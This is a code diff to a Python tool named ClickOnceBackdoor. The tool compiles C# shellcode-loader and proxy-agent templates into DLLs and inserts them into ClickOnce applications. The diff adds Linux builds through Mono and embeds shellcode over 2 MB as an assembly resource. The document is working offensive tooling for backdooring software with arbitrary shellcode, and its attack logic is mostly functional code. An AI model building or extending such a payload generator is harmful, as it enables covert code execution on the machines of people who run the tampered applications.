@@ -35,12 +35,19 @@ def sha256_base64(fp):
 def file_size(fp): return os.path.getsize(fp)
 
 def find_csc():
-    """Locate csc.exe, preferring modern Roslyn compiler over .NET Framework 4.x.
+    """Locate C# compiler — supports csc.exe (Windows) and mcs (Linux/Mono).
 
-    The .NET Framework 4.x csc.exe (v4.0.30319) only supports C# 5.
-    Our templates use C# 6+ features (expression-bodied members, etc.),
-    so we prefer the Roslyn-based compiler from Visual Studio or NuGet.
+    Search order:
+    1. Mono mcs (Linux/macOS — cross-platform builds)
+    2. Visual Studio Roslyn csc.exe
+    3. NuGet-installed Roslyn compiler
+    4. csc on PATH
+    5. .NET Framework csc.exe (C# 5 only, last resort)
     """
+    # 0. Mono mcs — enables Linux builds for ClickOnce payloads
+    mcs = shutil.which('mcs')
+    if mcs: return Path(mcs)
+
     # 1. Visual Studio / Build Tools Roslyn installations
     for prog in [os.environ.get('ProgramFiles', r'C:\Program Files'),
                  os.environ.get('ProgramFiles(x86)', r'C:\Program Files (x86)')]:
@@ -231,7 +238,12 @@ def _load_template(name):
 
 def load_poc_template():       return _load_template('MessageBoxPoC.cs')
 def load_sc_template():        return _load_template('ShellcodeLoader.cs')
+def load_sc_resource_template(): return _load_template('ShellcodeLoaderResource.cs')
 def load_proxyblob_template(): return _load_template('ProxyBlobAgent.cs')
+
+# Threshold above which shellcode is embedded as an assembly resource
+# instead of a base64 string literal (avoids Mono user string heap limit)
+_SC_RESOURCE_THRESHOLD = 2 * 1024 * 1024  # 2 MB
 
 CFG_TPL = '''<?xml version="1.0" encoding="utf-8"?>
 <configuration>
@@ -336,22 +348,38 @@ class ClickOnceBackdoor:
                  'nuget install Microsoft.Net.Compilers.Toolset')
         self.log('  Installed Roslyn compiler','OK')
 
-    def _compile_cs(self, cs_path, dll_path, references=None):
-        """Compile a .cs file to a DLL using csc.exe."""
-        packages_dir = Path(__file__).parent / 'packages'
-        self._ensure_roslyn_compiler(packages_dir)
+    def _compile_cs(self, cs_path, dll_path, references=None, resources=None):
+        """Compile a .cs file to a DLL using csc.exe or mcs (Mono).
+
+        Args:
+            resources: list of (file_path, resource_name) tuples for embedded resources
+        """
         csc = find_csc()
+        is_mono = csc and csc.name == 'mcs'
+
+        if not is_mono:
+            packages_dir = Path(__file__).parent / 'packages'
+            self._ensure_roslyn_compiler(packages_dir)
+            csc = find_csc()
+
         if not csc:
             raise FileNotFoundError(
-                'csc.exe not found. Ensure .NET Framework 4.x or Visual Studio is installed.')
-        self.dbg(f'Using compiler: {csc}')
+                'No C# compiler found. Install Mono (mcs), .NET Framework, or Visual Studio.')
+        self.dbg(f'Using compiler: {csc} ({"Mono" if is_mono else "csc"})')
         cmd = [str(csc), '/t:library', f'/platform:{self.platform}',
-               '/nologo', f'/out:{dll_path}']
+               f'/out:{dll_path}']
+        if not is_mono:
+            cmd.insert(1, '/nologo')
         for ref in (references or []):
             cmd.append(f'/r:{ref}')
+        for res_path, res_name in (resources or []):
+            if is_mono:
+                cmd.append(f'/resource:{res_path},{res_name}')
+            else:
+                cmd.append(f'/resource:{res_path},{res_name}')
         cmd.append(str(cs_path))
         self.dbg(f'Compiling: {" ".join(cmd)}')
-        _run_cmd(cmd, 'csc.exe compilation')
+        _run_cmd(cmd, f'{"mcs" if is_mono else "csc"} compilation')
         self.log(f'  Compiled: {dll_path.name} ({file_size(dll_path):,} bytes)','OK')
 
     def _ilmerge(self, pre_dll, final_dll, merge_dlls, packages_dir):
@@ -463,17 +491,35 @@ class ClickOnceBackdoor:
             pre_dll.unlink(missing_ok=True)
             cs.unlink(missing_ok=True)
         elif self.shellcode_path and self.shellcode_path.exists():
-            tpl = load_sc_template()
-            if not tpl:
-                raise FileNotFoundError(
-                    'examples/ShellcodeLoader.cs not found. Ensure examples/ is next to this script.')
-            with open(self.shellcode_path,'rb') as f: sc = f.read()
-            cs_src = tpl.replace('{CLASSNAME}', self.class_name).replace('{SHELLCODE}', base64.b64encode(sc).decode())
-            cs = self.app_dir / f'{self.dll_name}.cs'
-            cs.write_text(cs_src, encoding='utf-8')
-            self.log(f'  Generated shellcode loader: {cs.name}','OK')
-            self._compile_cs(cs, dst)
-            cs.unlink(missing_ok=True)
+            sc_size = file_size(self.shellcode_path)
+            use_resource = sc_size >= _SC_RESOURCE_THRESHOLD
+            if use_resource:
+                tpl = load_sc_resource_template()
+                if not tpl:
+                    raise FileNotFoundError(
+                        'examples/ShellcodeLoaderResource.cs not found. Ensure examples/ is next to this script.')
+                res_name = 'sc.bin'
+                cs_src = tpl.replace('{CLASSNAME}', self.class_name).replace('{RESOURCENAME}', res_name)
+                cs = self.app_dir / f'{self.dll_name}.cs'
+                cs.write_text(cs_src, encoding='utf-8')
+                self.log(f'  Shellcode {sc_size:,} bytes — using resource embedding (>{_SC_RESOURCE_THRESHOLD:,} byte threshold)','OK')
+                sc_copy = self.app_dir / res_name
+                shutil.copy2(str(self.shellcode_path), str(sc_copy))
+                self._compile_cs(cs, dst, resources=[(str(sc_copy), res_name)])
+                cs.unlink(missing_ok=True)
+                sc_copy.unlink(missing_ok=True)
+            else:
+                tpl = load_sc_template()
+                if not tpl:
+                    raise FileNotFoundError(
+                        'examples/ShellcodeLoader.cs not found. Ensure examples/ is next to this script.')
+                with open(self.shellcode_path,'rb') as f: sc = f.read()
+                cs_src = tpl.replace('{CLASSNAME}', self.class_name).replace('{SHELLCODE}', base64.b64encode(sc).decode())
+                cs = self.app_dir / f'{self.dll_name}.cs'
+                cs.write_text(cs_src, encoding='utf-8')
+                self.log(f'  Generated shellcode loader: {cs.name} ({sc_size:,} bytes, inline base64)','OK')
+                self._compile_cs(cs, dst)
+                cs.unlink(missing_ok=True)
         elif self.poc:
             tpl = load_poc_template()
             if not tpl:
